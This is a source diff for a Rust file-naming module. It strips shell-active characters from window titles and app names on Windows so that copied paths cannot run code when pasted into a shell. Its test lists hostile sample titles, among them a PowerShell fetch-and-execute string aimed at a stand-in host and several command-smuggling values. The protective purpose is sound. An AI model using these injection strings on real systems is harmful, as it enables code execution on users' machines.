@@ -4,7 +4,8 @@
 //! A filled-in template is one file name, never a path: the values of `{app}` and `{title}` come
 //! from other apps, so a separator, `..`, a leading dot, a control or bidi character or a
 //! reserved device name (`CON`, `NUL`, `COM1`…) can reach it, and each is neutralised before the
-//! name meets the file system.
+//! name meets the file system. On Windows those two values also lose the characters a shell runs
+//! code with inside the quotes of a copied path ([`SHELL_ACTIVE`]).
 
 use std::collections::HashSet;
 use std::fs::{self, File, OpenOptions};
@@ -52,11 +53,12 @@ pub fn file_stem_titled(template: &str, naming: &Naming, title: Option<&str>, co
     // Each value is made safe before it goes in, so it cannot form a separator or `..` together
     // with the template's own characters; the whole name is checked once more afterwards.
     let value = |text: &str| neutralise(text);
+    let foreign = |text: &str| foreign_value(text, cfg!(windows));
     let name = template
         .replace("{date}", &value(&naming.date))
         .replace("{time}", &value(&naming.time))
-        .replace("{app}", &value(naming.app.unwrap_or("Screen")))
-        .replace("{title}", &value(title.unwrap_or("")))
+        .replace("{app}", &foreign(naming.app.unwrap_or("Screen")))
+        .replace("{title}", &foreign(title.unwrap_or("")))
         .replace("{counter}", &counter.to_string())
         .replace("{width}", &naming.width.to_string())
         .replace("{height}", &naming.height.to_string());
@@ -88,6 +90,25 @@ pub fn sanitize(name: &str) -> String {
         return format!("_{trimmed}");
     }
     trimmed.to_string()
+}
+
+/// What a Windows shell acts on inside the double quotes `send::quote_path` puts around a copied
+/// path: `$` and the backtick start a substitution in Git Bash, `!` a history expansion in an
+/// interactive bash, and PowerShell ends a double-quoted string at the typographic double quotes.
+/// The quoting escapes these for PowerShell, but no quoting suits PowerShell, cmd and bash at
+/// once, so a name never takes them from another app.
+const SHELL_ACTIVE: [char; 6] = ['$', '`', '!', '\u{201C}', '\u{201D}', '\u{201E}'];
+
+/// The value of `{app}` or `{title}`, which other apps choose (a web page's title, anyone):
+/// neutralised, and on Windows without the characters of [`SHELL_ACTIVE`]. The quoting of macOS
+/// and Linux escapes all of them, so names there keep them.
+fn foreign_value(text: &str, windows: bool) -> String {
+    let text = neutralise(text);
+    if windows {
+        text.chars().filter(|c| !SHELL_ACTIVE.contains(c)).collect()
+    } else {
+        text
+    }
 }
 
 /// Swaps every character no file name may hold for `-`.
@@ -399,5 +420,19 @@ mod tests {
                 assert_eq!(path.parent().unwrap(), dir.path(), "{template} with {value:?} wrote {}", path.display());
             }
         }
+    }
+
+    /// A web page's title never brings shell syntax into a Windows name, so a copied path pasted
+    /// into Git Bash, PowerShell or cmd runs nothing; elsewhere the title stays as it reads.
+    #[test]
+    fn a_title_brings_no_shell_syntax_into_a_windows_name() {
+        let titles =
+            ["$(iwr evil|iex)", "`calc`", "${env:PATH} $HOME", "!r !-1", "x\u{201D}; calc; \u{201C}y \u{201E}z"];
+        for title in titles {
+            let windows = foreign_value(title, true);
+            assert!(!windows.contains(SHELL_ACTIVE), "{title:?} gave {windows:?}");
+        }
+        assert_eq!(foreign_value("Fiyat $5!", true), "Fiyat 5");
+        assert_eq!(foreign_value("Fiyat $5!", false), "Fiyat $5!");
     }
 }
